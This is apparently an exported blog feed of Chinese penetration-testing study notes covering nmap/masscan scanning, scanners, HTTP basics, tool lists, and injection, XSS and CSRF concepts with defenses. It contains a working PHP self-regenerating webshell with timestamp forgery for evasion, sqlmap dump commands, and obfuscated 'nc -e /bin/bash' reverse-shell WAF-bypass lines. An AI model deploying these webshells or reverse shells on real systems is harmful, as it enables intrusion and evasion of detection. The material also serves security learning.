open vnc Apple remote desktop vncService Info: OS: Mac OS X; CPE: cpe:/o:apple:mac_os_xService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 6.98 seconds ~ nmap 10.20.24.244 -AStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 21:13 CSTNmap scan report for 10.20.24.244Host is up (0.00026s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION5900/tcp open vnc Apple remote desktop vnc|_ssl-cert: ERROR: Script execution failed (use -d to debug)|_ssl-date: ERROR: Script execution failed (use -d to debug)|_sslv2: ERROR: Script execution failed (use -d to debug)|_tls-alpn: ERROR: Script execution failed (use -d to debug)|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)|_vnc-info: ERROR: Script execution failed (use -d to debug)Service Info: OS: Mac OS X; CPE: cpe:/o:apple:mac_os_xService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds# 操作系统探测➜ ~ sudo nmap 10.211.55.17 -OStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 21:25 CSTNmap scan report for windows-7-1.shared (10.211.55.17)Host is up (0.00015s latency).Not shown: 991 closed portsPORT STATE SERVICE135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-ds49152/tcp open unknown49153/tcp open unknown49154/tcp open unknown49155/tcp open unknown49156/tcp open unknown49158/tcp open unknownMAC Address: 00:1C:42:86:1B:DE (Parallels)Device type: general purposeRunning: Microsoft Windows 7|2008|8.1OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1Network Distance: 1 hopOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 3.54 seconds 保存输出 选项 说明 -oN 标准保存 -oX XML 保存 快速找到.xml文件中的ip: VSCode ctrl + f 用最右面正则表达式搜索 1((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125; Ctrl + Shift + L 选择所有出现在当前选中的行 VSCode 批量处理ip格式问题： 123开头标记：^ 换成 http://结尾标记：$ 换成 :8080全选后再替换 Masscan项目地址：https://github.com/robertdavidgraham/masscan 12345678# 扫描整个互联网masscan 0.0.0.0/0 -p0-65535# 输出到文件中masscan 0.0.0.0/0 -p0-65535 -oX scan.xml# 默认的速率100包/秒，如果是扫描全网的话，需要提高速度。masscan 0.0.0.0/0 -p0-65535 --rate 100000 -oX scan.xml 实用正则 12345# 正则((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;# 换行^\s*(?=\r?$)\n 漏洞扫描工具市面上也有很多各种各样的开源、商业扫描器。单就应用这一层来说，漏洞扫描器一般分为主动扫描和被动扫描两种。 主动扫描主动扫描一般用于黑盒测试，其形式为提供一个URL入口地址，然后由扫描器中的爬虫模块爬取所有链接，对GET、POST等请求进行参数变形和污染，进行重放测试，然后依据返回信息中的状态码、数据大小、数据内容关键字等去判断该请求是否含有相应的漏洞。例如：AWVS、Nessus、唐朝扫描器、BugScan、Pocsuite 被动扫描被动扫描，与主动扫描相比，被动扫描并不进行大规模的爬虫爬取行为，而是直接通过捕获测试人员的测试请求，直接进行参数变形和污染来测试服务端的漏洞，如果通过响应信息能够判断出漏洞存在，则进行记录管理，有人工再去进行漏洞的复现和确认。例如：BurpSuite、Xray 主动扫描与被动扫描最主要的区别为被动式扫描器不主动获取站点链接，而是通过流量、获取测试人员的访问请求等手段去采集数据源，然后进行类似的安全检测。 主动扫描的 Web 扫描器的一些不足： 由于数据源来自爬虫爬取，独立的页面、API接口等就无法覆盖，存在检测遗漏情况。 果是扫描单独的几个站点，主动扫描是够用的。但是在站点数量急剧增大的时候，主动扫描的效率、精准、速度都无法与被动扫描相比。 AWVS Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。AWVS可以检查SQL注入漏洞，也可以检查跨站脚本攻击漏洞，可以扫描任何可以通过web浏览访问和遵循HTTP/HTTPS规则的 Web 站点和 Web应用程序。 黑科技： 扫描过程： Nessus 主机漏洞扫描 Nessus 在全世界有超过 75000 个组织在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。Nessus 不同于传统的漏洞扫描软件，支持分布式扫描。 Linux下 Nessus 常用命令： 1234567systemctl status nessusd # 查看运行状态systemctl start nessusd # 启动 nessussystemctl stop nessusd # 停止 nessussystemctl restart nessusd# 重启 nessussystemctl enable nessusd # 开机自启systemctl disable nessusd# 关闭开机自启systemctl kill nessusd # 杀死 nessus 的子进程 基本网络扫描多用于进行主机扫描测试，可以扫描系统层面的漏洞： Web 应用测试也可以类型 AWVS 那样对 Web 应用进行测试： Xray 项目地址:https://github.com/chaitin/xray 长亭科技研发的一款完善的安全评估工具，支持常见Web安全问题扫描和自定义POC，虽然Github有项目，但是不开源，只提供社区版本供大家使用。 转载：https://www.sqlsec.com/2020/04/xray.html]]></content>
      <categories>
        <category>Penetration Test</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试基础]]></title>
    <url>%2Fnote%2F2020%2Fundefined01%2F35d3b1d4.html</url>
    <content type="text"><![CDATA[渗透测试基础渗透测试（Penetration Testing）是指受信任的第三方通过模拟黑客的攻击技术与手段对目标网络、系统进行攻击测试，发现目标的安全隐患并给出安全加固建议的一种安全测试与评估方法。 渗透测试的概念与流程受信任16 年 11 月 7 日，《中华人民共和国网络安全法》颁布以来，一切非授权的渗透测试行为都是违法的。 模拟黑客模拟黑客行为并不是真正的黑客行为，所以在渗透测试中涉及到高危操作的时候都需要上报并记录，高危行为如下： 上传 webshell 尤其是不死马不死马.php → 上传到server → server执行文件 → server本地无限循环生成 (一句话.php) 1234567891011121314151617181920&lt;?php// 函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行ignore_user_abort(true);// 函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制set_time_limit(0);// 删除文件本身，以起到隐蔽自身的作用unlink(__FILE__);$file = 'shell.php';$code = '&lt;?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72")&#123;@eval($_POST[a]);&#125; ?&gt;';while (1)&#123; file_put_contents($file,$code); // 以绕过“find –name '*.php' –mmin -10”命令检测最近10分钟修改或新创建的PHP文件 system('touch -m -d "2018-12-01 09:10:12" shell.php'); usleep(5000); // 一微秒等于百万分之一秒&#125;?&gt; 将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为 shell.php 的文件，然后使用中国蚁剑输入12345678910- 如果允许，**重启**服务器是万能的。- 其次，最好的解决方案是 kill 掉www-data用户的所有子进程```linuxls -lps aux | grep www-dataps aux | grep www-data| awk &apos;&#123;print $2&#125;&apos;ps aux | grep www-data| awk &apos;&#123;print $2&#125;&apos;|xargs kill -9rm shell.php 脱裤点到为止 国安法规定脱库条目不得超过五条 一般都使用 sqlmap 来进行脱裤，使用 –start –stop 来设置脱裤的起点和终点： 例：从1开始脱5条1sqlmap -u &quot;http://127.0.0.1:8888/Less-1/?id=1&quot; --dump -C&apos;id,username,password&apos; -T &apos;users&apos; -D &apos;security&apos; --start=1 --stop=5 如果要证明某个表下面的数量的话，直接使用 sqlmap 的 –count 参数即可1sqlmap -u &quot;http://127.0.0.1:8888/Less-1/?id=1&quot; --count -T &apos;users&apos; -D &apos;security&apos; 非授权不要随便去做 发现隐患渗透人员在不同的位置（比如从内网、从外网等位置）利用各种手段对业务系统进行全面深入的安全测试，以此挖掘可能存在的安全缺陷和漏洞。 服务器是如何被入侵的？在互联网中的一台服务器是如何被攻击者入侵的？攻击者要想先攻击服务器之前，必须先要保证他们之间能进行正常的通信。 那么此时客户端和服务端是怎么保证通信的呢？是端口。服务器上的各种服务，例如SSH、FTP、Web、数据库服务等等，它们会依托于端口来实现对外提供服务。 所以我们攻击者所入侵的其实也是端口，当然我们不排除“物理攻击”。而对于服务器的入侵方式有很多，比如端口扫描、SSH口令爆破、FTP爆破、缓冲区溢出攻击等等去直接获取目标的权限。但是由于现在 Web 应用的飞速发展，现在的战场逐渐转移到了 Web 之上。 所以正常的渗透测试流程是利用 Web 漏洞拿到 Web 权限，尝试 Getshell 拿到服务器普通用户的权限，提权拿到服务器的最高权限，服务器如果在内网的中的话，可以在内网中横向渗透在内网中拿到更多服务器的权限。 mi.com 只能扫描到8080 443 80 等Web端口 近源渗透测试近源渗透测试和传统的渗透测试的主要区别在于对“边界”概念的理解上。在传统的网络测试中，各类防火墙、入侵检测等防护产品已经较为成熟，攻击者很难通过外网的网络入口突破企业的重重防御措施。而在近源渗透测试的场景中，由于攻击者位于目标企业附近甚至建筑内部，这些地方往往存在大量被企业忽视的安全盲点。结合近源渗透的相关测试方法与技巧，测试人员可以利用各类无线通信网络、物理接口和智能设备来突破安全防线进入企业内网，最终威胁到企业的关键系统及敏感业务的信息安全。 小漫画：https://zhuanlan.zhihu.com/p/97865236 列举那些脆弱的 Web 应用CS即Client/Server(客户机/服务器)结构 C/S结构在技术上很成熟 BS即Browser/Server(浏览器/服务器)结构，就是只安装维护一个服务器(Server)，而客户端采用浏览器(Browse)运行软件。 目前 BS 越来越流行，Web 应用也越来越多，与我们的生活息息相关。下面来列举一些脆弱的 Web 应用： GOV 政府网站被挂博彩广告 以许某为骨干的菲律宾黑客团伙主要攻击入侵国内的新闻、学校、政府机关网站，通过寻找此类网站漏洞，植入木马病毒，控制网站服务器，加挂黑链自动链接博彩网站，或把境外博彩公司链接地址保存在搜索引擎内，当用户访问网站时，网站会自动跳转至境外博彩公司网页；用搜索引擎搜索“时时彩、博彩”等关键字时，就会优先显示境外博彩公司地址，以达到加大博彩公司访问量，吸引更多人参与赌博的目的。 反共黑客的黑页 反共黑客是反对中国共产党的黑客组织，其手段是通过掌握中国境内大量网站漏洞，采用预先植入后门等手段，控制一些网站服务器，持续篡改中国境内政府和重要信息系统部门、企事业单位网站，并在篡改页面上发布反对中国共产党言论。不过亦有针对广播电视网络的攻击。到2013年为止，它至少入侵了600余个中国境内网站。 网站暗链 正如其名，暗链就是指看不见的网站链接。由于暗链的嵌入做的十分隐蔽，短时间内很难被察觉，更不会自动跳转。这种连接类似于友情链接，对于单独页面可以有效提高其PR值。暗链分为两种情况，一种是主动隐藏别人网站的链接，另一种则是盗取自己的模板进而在上面保存很多自己的绝对地址。一般情况下，黑客通过设置使链接在页面不可见，但实际又存在，可以通过源码查看。通常方式有如设置css，使div等不可见或者使div的边距为负数，总之只要在页面上看不到就行，其位置一般处在源码的底部或者顶部。 发现漏洞黑盒测试 渗透测试人员在事前完全不了解任何目标内部信息，例如网络拓扑、应用、系统等信息，对目标系统进行渗透测试。黑盒测试所使用的时间相对较⻓，并且对于渗透人员的技术能力要求相对高一些。 白盒测试 渗透测试人员在事前已经获取目标内部信息，例如网络拓扑、应用、系统、源代码等信息，对目标系统进行渗透测试。对比黑盒测试，白盒测试往往能用最小的代价，发现目标更多的安全隐患。具体漏洞细节又包括：Google Hack、目录扫描、Web漏洞扫描、暴力破解、信息泄露、任意文件上传、SQL 注入漏洞、XSS漏洞、CSRF 漏洞、SSRF 漏洞、任意文件下载读取删除漏洞、越权漏洞、业务逻辑漏洞、XXE漏洞、Xpath注入漏洞、反序列化漏洞、Web框架漏洞、弱口令、命令执行漏洞、拒绝服务攻击漏洞等 PTES 渗透测试 前期交互在进行渗透测试之前，渗透测试团队需要与客户组织交互讨论，确定渗透测试目标、渗透测试范围、渗透测试限制条件、服务合同等细节进行商议，达成一致协议。 需要收集客户需求，根据商定的目标、范围、限制条件，项目管理与规划等信息来确定渗透测试方案。 信息收集 根据确定的渗透测试目标以及范围，使用各种手段尽可能的收集与测试目标相关的信息。例如开源情报(OSINT)、Google Hacking、扫描探测等。收集到的信息越充分对之后的渗透测试越有利。 系统信息 业务信息 根据确定的渗透测试目标以及范围，使用各种手段尽可能的收集与测试目标相关的信息。例如开源情报(OSINT)、Google Hacking、扫描探测等。收集到的信息越充分对之后的渗透测试越有利 渗透测试的本质就是信息收集 威胁建模 攻击规划 攻击渗透渗透测试团队需要对收集到的信息进行分析并且做出攻击的规划，确定出最有效、最可行的攻击方案。 漏洞分析 应用漏洞 业务漏洞根据攻击方案，需要挖掘可利用的漏洞来获取目标系统的访问控制权限。通过分析信息收集到的数据，比如系统信息、漏洞扫描结果等，进行验证并发现漏洞。挖掘目标系统中可利用的潜在漏洞，并开发EXP脚本。渗透攻击利用发现的安全漏洞或编写好的漏洞利用程序（Exploit）来入侵目标系统，获得访问控制权。 渗透攻击 入侵攻击 获取权限过程中可能会因为Exp的兼容性，需要对其进行修改或额外研究。还需要考虑对目标系统的安全机制进行逃逸，避免被发现。后渗透攻击 内网渗透 资料整理 需要渗透测试团队根据目标组织的业务经营模式、资产保护模式和安全防御规划的不同特点，资助设计出攻击目标，识别关键基础设施，并寻找客户组织组织最具价值和尝试安全保护的信息和资产，最终达到能够对客户组织造成最重要业务影响的攻击途径。 渗透报告渗透测试报告中会涵盖之前所有阶段所收集的关键情报信息、挖掘出的安全漏洞、成功渗透攻击的过程、造成业务影响后果的攻击途径。从防御⻆度考虑的安全防御体系存在的薄弱点、⻛险以及修复建议。 专业术语 POC（Proof of Concept）：概念验证，用于验证安全漏洞是否存在，能否被利用。 EXP（Exploit）：漏洞利用程序，利用安全漏洞造成入侵或破坏效果的程序。 Payload，有效荷载、攻击载荷，目标系统被渗透攻击之后所执行的代码。 安全漏洞是存在生命周期的，简单的可以分为几个阶段： 漏洞被发现 漏洞/Exploit信息披露公布 漏洞具有官方补丁或修复方案 同时也繁生出几个概念，分为是： 0day，漏洞信息未公布时，这时利用 EXP 可以通杀。 1day，漏洞信息被公布，但漏洞没有官方补丁或者修复方案，这时利用 EXP 可以入侵大部分系统。 Nday，漏洞已有官方补丁或者修复方案，这时利用 EXP 只能入侵还未及时修复的系统。 Web服务端概述在 Web 的世界中，分为客户端与服务端。客户端就是我们常用的浏览器，服务端是提供 Web 服务的服务器。 静态网页与动态网页的区别 web服务器IIS,apache,tomcat,nginx (负载均衡好，抗压能力强) 静态网页静态网⻚是以.htm、.html为后缀的文件 动态网页动态网⻚一般是以 .php、.jsp、.asp、.aspx 为后缀的文件 访问静态网⻚流程 服务端中真正接收处理报文的是 Web 应用服务器（Web容器、中间件）。常⻅的Web 应用服务器有 Apache、IIS、Tomcat、Nginx等等。Web应用服务器是专⻔用于提供HTTP服务，它会处理接收到的HTTP请求，最后构建HTTP报文进行响应。 从宏观的层面来简单的理解 Web 应用服务器处理 HTTP 报文的过程，以Apache为例： 访问动态网⻚流程访问的动态网⻚一般是以 .php、.jsp、.asp、.aspx 为后缀的文件。这些文件的内容一般是由 HTML+CSS+JavaScript+后端语言代码构成。例如 .php 的后缀的文件，文件内容中就会带有PHP代码。 动态网⻚的大致请求过程如下： Web服务架构 LNMP：Linux、Nginx、MySQL、PHP LAMP：Linux、Apache、MySQL、PHP 常⻅的 Web 服务架构： | 操作系统 | Web应用服务器 | 动态脚本引擎 | 数据库服务 | 数据库端口 || ————- | ————- | ———— | ———- | ———- || Windows | IIS | ASP(.NET) | SQLServer | 1433 || Windows/Linux | Apache/Nginx | PHP | MySQL | 3306 || Windows/Linux | Tomcat | JSP | Oracle | 1521 | URL 与 URL 编码 URL简介 统一资源定位符（Uniform Resource Locator，常缩写为URL），有时也被俗称为网页地址（网址）。![url格式] 协议类型:[//服务器地址[:端口号]][/资源层级UNIX文件路径]文件名[?查询][#片段ID]下是常⻅的 URL 编码字符： 字符 URL编码 = %3d # %23 % %25 &amp; %26 / %2f 空格 %20 换行 %0a 空字节 %00 另一个值得注意的编码字符是加号（+），它也可以代表 URL 编码的空格。 浏览器发送数据时自动对url进行编码 HTTP 协议报文HTTP（HyperText Transfer Protocol）既超文本传输协议，是一种详细规定了浏览器和万维网服务器之间互相通信的规则。 http协议简介HTTP协议它遵循请求(Request)/应答(Response)模型，浏览器向服务器发送请求时，Web服务器处理请求并返回适当的应答。所以在发送一次HTTP请求会产生两类报文，分别是请求报文与响应报文。它也是一种无状态的协议。 无状态意味着当一个客户端向服务器端发送请求，然后Web服务器返回响应(Response)，连接就被关闭了。在服务器端不保留连接的有关信息。也就是说，HTTP请求只能由客户端发起 HTTP 请求报文HTTP 请求报文由请求行、请求头部、空行和请求数据4个部分组成 请求行 HTTP 协议的请求方法有GET、POST、HEAD、PUT、DELETE、OPTIONS、TRACE、CONNECT。 GET请求GET 是最常用的方法。通常用于请求服务器发送某个资源。 在 GET 请求中，查询字符串是在 URL 中发送的：1/index.php?r=default/news/content&amp;id=1 URL 是存在⻓度限制的，所以 GET 请求所传递的数据是有限的 POST请求在 POST 请求中，查询字符串是在 POST 请求的 请求正文中发送的：1name=123&amp;word=123&amp;cooktime=0&amp;checkcode=7926 POST 请求的数据是没有大小限制的 HEAD请求HEAD 方法与 GET 方法的行为很类似，但服务器在响应中只返回首部，不会返回实体的主体部分。所以速度比GET快。通过查看响应中的状态码，看看某个对象是否存在。 扫描器经常使用HEAD方法。 PUT请求与 GET 从服务器读取文档相反，PUT 方法会向服务器写入文档。如果文件已经存在，则覆盖。 IIS6 PUT 漏洞 DELETE请求DELETE 方法所做的事情就是请服务器删除请求 URL 所指定的资源 OPTIONS请求OPTIONS 方法请求 Web 服务器告知其支持的各种功能。可以询问服务器通常支持哪些方法，或者对某些特殊资源支持哪些方法。 拓展方法扩展方法 指的就是没有在 HTTP/1.1 规范中定义的方法。服务器会为它所管理的资源实现一 些 HTTP 服务，这些方法为开发者提供了一种扩展这些 HTTP 服务能力的手段。 方法 描述 LOCK 允许用户“锁定”资源——比如，可以在编辑某个资源的时候将其锁定，以防别人同时对其进行修改。 MKCOL 允许用户创建资源 COPY 便于在服务器上复制资源MOVE在服务器上移动资源 请求头部请求头部用来告知服务器有关于客户端请求的信息，由关键字/值对组成，每行一对，关键字和值用英文冒号:分隔: 请求头部详解 HTTP响应报文HTTP响应报文由状态行、消息报头、空行、响应正文4个部分组成： 状态行状态行由HTTP协议版本、状态码和状态描述3个字段组成，它们用空格分隔。状态码是客户端理解事务处理结果的快捷方式。有以下类型组成: 状态码 描述 1xx 指示信息–表示请求已接收，继续处理 2xx 成功–表示请求已被成功接收、理解、接受 3xx 重定向–要完成请求必须进行更进一步的操作 4xx 客户端错误–请求有语法错误或请求无法实现 5xx 服务器端错误–服务器未能实现合法的请求 常⻅状态码描述： 状态码 原因 短语含义 200 OK 客户端请求成功没有问题 302 Found 重定向，客户端应该使用 Location 首部给出的URL 来临时定位资源 304 Not Modified 直接使用本地缓存 400 Bad Request 客户端请求有语法错误，不能被服务器所理解 401 Unauthorized 请求未经授权认证 403 Forbidden 服务器收到请求，但是拒绝提供服务访问一个网站目录常出现这种情况 404 Not Found 请求资源不存在 405 Method NotAllowed 发请求中带有所请求的方法不允许 500 InternalServer Error 服务器发生不可预期的错误 502 BadGateway 无法连接到其父网关 503 ServiceUnavailable 服务器当前不能处理客户端的请求 响应头部响应头部用来描述服务器信息的，由关键字/值对组成，每行一对，关键字和值用英文冒号:分隔: 响应正文响应正文会返回请求资源的源码信息，然后这些源码通过浏览器渲染就呈现出我们所看到的效果: Http与HttpsHTTP是不安全的，它具有许多安全⻛险： 窃听⻛险：黑客可以获知通信内容。 篡改⻛险：黑客可以修改通信内容。 冒充⻛险：黑客可以冒充他人身份参与通信。 HTTPS（HyperText Transfer Protocol over Secure Socket Layer），它的基础是SLL/TLS，既在HTTP下加入 SSL/TLS层。 HTTPS通过安全传输机制进行传送数据，这种机制可以保护网络传送的所有数据的隐秘性与完整性 Cookie 与 Session 原理简介 由 HTTP 协议是无连接无状态的，所以 HTTP 协议无法记住客户端的信息。为了弥补HTTP协议这两点的“不足”，所以出现了会话技术。一个是 Cookie，而另一个则是 Session。 CookieCookie 是由服务器端生成，服务器将数据通过 HTTP 响应存储到浏览器上，这就是 Cookie。浏览器可以在以后携带对应的 Cookie 数据访问服务器 SessionSession 与浏览器无关，但是与 Cookie 有关。Session 是以 Cookie 为基础，将重要的数据保存在服务器端，同时将能够唯一表示这份数据的数据以 cookie 的形式保存在客户端。 第一次访问： 创建SessionId 初始化超全局变量$_SESSION 在php指定目录创建以SESSIONId为名的文件 脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SessionID对应的文件中。并将SESSIONID以SETCOOKIE的形式返回给客户端 第二次访问： 检测到客户端的COOKIE中的SESSIONID 初始化超全局变量$_SESSION 找到文件，反序列化读取数据存储到$_SESSION中。 脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SESSIONID对应的文件中。 web应用判断用户登录 当用户提交的帐号密码正确后，服务端会使用SESSION将用户信息存储到服务端。并将SESSIONID以SETCOOKIE的形式返回给客户端。 当用户第二次访问站点时，会自动带上COOKIE信息，那么服务端会根据COOKIE中的SESSIONID进行匹配数据。如果存在数据，则说明已经登录过，为登录状态。如果不存在数据，则说明没有登录，为未登录状态 渗透测试环境与工具工欲善其事，必先利其器 操作系统 Windows 10 优点：WSL、国产工具比较多 缺点：Docker 安装、游戏丰富多彩 Linux（Ubuntu、Deepin、Kali） 优点：国际工具兼容性好 缺点：exe 小工具无法运行、软件生态不好 macOS 优点：软件生态好、Uninx血统 缺点：国产小工具得开虚拟机 浏览器Chome 插件名 说明 Charset 修改网站的默认编码 Fatkun 图片批量下载批量爬取下载图片神器 Link Grabber 批量提取网⻚链接 ProxySwitchyOmega 轻松快捷地管理和切换多个代理 Shodan 信息收集插件之端口探测 Tampermonkey 支持各种强大的插件 uBlacklist 禁止特定的网站显示在 Google的搜索结果中 Wappalyzer 网站指纹基础信息探测超级简单的自动刷新顾名思义，自动刷新 Fiefox 完美适配Hackbar：https://wws.lanzous.com/iRZjdfc8mjg 插件名 说明 ProxySwitchyOmega 轻松快捷地管理和切换多个代理 Hackbar 半自动化注入必备 Hackbar https://wws.lanzous.com/ilIDXfc8n2f | 工具推荐 工具 说明 AWVS 13 经典的自动化 Web 漏洞扫描神器 antSword 实用强大 Webshell 管理工具 antSwordBehinder “冰蝎”动态二进制加密网站管理客户端 BurpSuite 渗透测试抓包改包必备 Cmder Windows 下 Cmd 增强 Cobalt Strike 内网渗透代理神器 CSdirsearch 强大的目录扫描工具 dirsearch sqlmapSQL 注入必备神器 Terminus 跨平台高颜值的终端 Typora 跨平台使用的 Markdown 编辑器 Metasploit 知名开源的漏洞攻击框架 mimikatz 读取已经登录过的用户Hash和明文密码 MobaXtermWindows 下好用的终端，支持多协议 NavicatPremium 强大的第三方数据库管理工具 Nmap 端口扫描必备工具 phpStudy 2018版 Windows 下经典的 PHP 环境搭建工具 WebRobot 比较好用的爬虫工具 VSCode 开源强大跨平台的编辑器 zenmap Nmap 的官方图形化界面]]></content>
      <categories>
        <category>Penetration Test</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安服问题]]></title>
    <url>%2Fnote%2F2020%2Fundefined30%2F6a2e2a4a.html</url>
    <content type="text"><![CDATA[渗透测试基本流程1.信息收集 服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等） 网站指纹识别（包括，cms，cdn，证书等），dns记录 whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等） 子域名收集，旁站查询(有授权可渗透)，C段等 google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等 扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等 传输协议，通用漏洞，exp，github源码等 2.漏洞挖掘 XSS，SQL注入，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，使用漏扫工具等 3.漏洞利用|提权 mysql提权，linux系统提权 4.编写报告|清除测试数据 5.漏洞复测 sqlmap的运行机理 尝试连接目标网站 确认目标网站是否为动态网页 通过报错确认数据库的类型 添加payload进行测试 测试出注入类型后会对数据库版本进行猜测 最后的出结论 .htaccess利用 htaccess是超文本访问（Hypertext Access）的缩写，是一个基于Apache的Web服务器使用的配置文件，用于控制它所在的目录以及该目录下的所有子目录。 .htaccess文件的主要功能包括使用密码保护文件夹，禁止或允许用户使用IP地址访问，禁止目录浏览，将用户自动重定向到另一个页面或目录，创建和使用自定义错误页面，改变具有特定扩展名的文件的使用方式，或者通过指定文件扩展名或特定文件作为主页。 用连续的弹出图片骚扰用户 可以上传图片马，将jpg文件解析为php文件 sql注入原理及防御原理 ： 当网站在向后台数据库传递SQL语句进行数据库操作时。如果对用户输入的参数没有经过严格的过滤处理，那么恶意访问者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。 防御： 关闭错误提示，php.ini中的display_errors=Off 魔术引号当php.ini里的magic_quotes_gpc=On时。提交的变量中所有的单引号（’）、双引号（”）、反斜线（/）与 NUL（NULL 字符）会自动转为含有反斜线的转义字符。 通过使用参数化查询和对象关系映射(Object Relational Mappers，ORM)，来避免和修复注入漏洞。此类查询通过指定参数的占位符，以便数据库始终将它们视为数据，而非SQL命令的一部分。 使用转义字符 命令执行命令执行漏洞原理：应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。 命令执行漏洞利用条件： 应用调用执行系统命令的函数 将用户输入作为系统命令的参数拼接到了命令行中 没有对用户输入进行过滤或过滤不严漏洞分类： 代码层过滤不严 商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：system(“/bin/program –arg $arg”); 系统的漏洞造成命令注入 bash破壳漏洞（CVE-2014-6271） 调用的第三方组件存在代码执行漏洞 如wordPress中用来处理图片的imageMagick组件JAVA中的命令执行漏洞（struts2/ElasticsearchGroovy等）ThinkPHP命令执行 漏洞危害： 继承Web服务程序的权限去执行系统命令或读写文件 反弹shell 控制整个网站甚至服务器 进一步内网渗透 命令拼接符|、||、&amp;、&amp;&amp;的区别：&amp;：无论左边是false还是true，右边都执行&amp;&amp;：具有短路效果，左边是false，右边不执行。|:无论左边是false还是true，右边都会执行||：具有短路效果，左边是true，右边不执行。 代码执行： 利用系统函数实现命令执行，在php下，允许命令执行的函数有：eval（）、assert（）、preg_replace（）、call_user_func（）如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞 其他函数ob_start（）、unserialize（）、creat_function（）、usort（）、uasort（）、uksort（）、array_filter（）、array_reduce（）、array_map（）…… 系统命令执行漏洞 system（） exec（） shell_exec（） passthru（） pcntl_exec（） popen（） proc_open（） 反引号…… 命令执行WAF绕过技巧 技巧一：通配符ls-l使用通配符/?in/?s-l /???/??t /??c/p???w?有时候WAF不允许使用太多的？号/?in/cat/?tc/p?sswd NC反弹shell:nc -e /bin/bash 127.0.0.1 3737为了避免符号，可以将IP地址转换成整型。127.0.0.1-&gt;2130706433 使用通配符root@kali:~#/??n/?c -e/??n/b??h 2130706433 3737 技巧二：连接符 技巧三：未初始化的bash变量在bash环境中允许我们使用未初始化的bash变量，如何$a ,$b,$c我们事先并没有定义它们，输出看看:root@kali:~# echo $aroot@kali:~# echo $broot@kali:~# echo $croot@kali:~#未初始化的变量值都是null 读取/etc/passwd:cat$a /etc$a/passwd$a 测试WAF测试代码：&lt;?phpecho “OK”;system(‘dig’.$_GET[‘host’]);?&gt; www.baidu.com;$s/bin$s/which$s nc$s反弹shell:/bin$s/nc$s -e/bin$s/bash$s 2130706433 3737 漏洞修复： 尽量少用执行命令的函数或者直接禁用 参数值尽量使用引号包括 在使用动态函数之前，确保使用的函数是指定的函数之一 在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义 对PHP语言来说，不能完全控制的危险函数最好不要使用 XSS漏洞​ 恶意攻击者往Web页面里插入恶意javaScript代码，当用户浏览该页之时，嵌入其中Web里面的javaScript代码会被执行，从而达到恶意攻击用户的目的。 反射型XSS：攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。 存储型XSS：代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie。 DOM性XSS：DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。 防御： 进行输入检查，限制输入允许的字符，让特殊字符的攻击失效。XSS Filter 开启HttpOnly，解决xss后的cookie劫持问题 进行输出过滤，所有需要输出到页面的元素全部通过HTMLEncode CSRFCSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。 防御： 同源检测 禁止不受信任的域名对我们发起请求。 Origin Header Referer Header 